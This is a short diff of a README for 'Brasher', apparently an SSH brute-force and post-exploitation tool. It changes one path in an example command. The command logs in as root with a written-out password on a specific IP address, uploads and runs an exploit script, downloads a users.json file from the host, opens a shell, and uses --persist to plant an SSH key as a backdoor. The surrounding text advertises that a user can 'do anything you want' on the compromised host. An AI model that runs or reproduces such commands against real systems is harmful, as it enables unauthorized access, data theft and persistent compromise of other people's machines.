@@ -154,7 +154,7 @@ Yes, Brasher can do that too. After receiving login credentials, you can specify
 Another cool feature is the --persist flag. This flag is only supported over SSH. When specified, Brasher will attempt to add your key to the SSH key authentication list and allow you to connect using your key. This mode has not yet been fully tested. In fact, Brasher offers excellent post-exploitation capabilities: you can perform RCE-like attacks and do anything you want. Here's an example of running Brasher with post-exploitation enabled:
 
 ```
-python3 brasher.py -u "root" -p 'EhGe1hK5400qjFgFLM9SbTyJu8Yr' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 --exploit "exploit.py" --upload-file-to "/root/" --upload-file-from "./exploit.py" --download-file-to "/home/result.txt" --download-file-from "./root/users.json" --shell --persist
+python3 brasher.py -u "root" -p 'EhGe1hK5400qjFgFLM9SbTyJu8Yr' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 --exploit "exploit.py" --upload-file-to "/root/file.py" --upload-file-from "./exploit.py" --download-file-to "/home/result.txt" --download-file-from "./root/users.json" --shell --persist
 ```
 <img width="729" height="96" alt="изображение" src="https://github.com/user-attachments/assets/c3c07c3f-7689-4d2f-b5db-39ed64901b7e" />
 
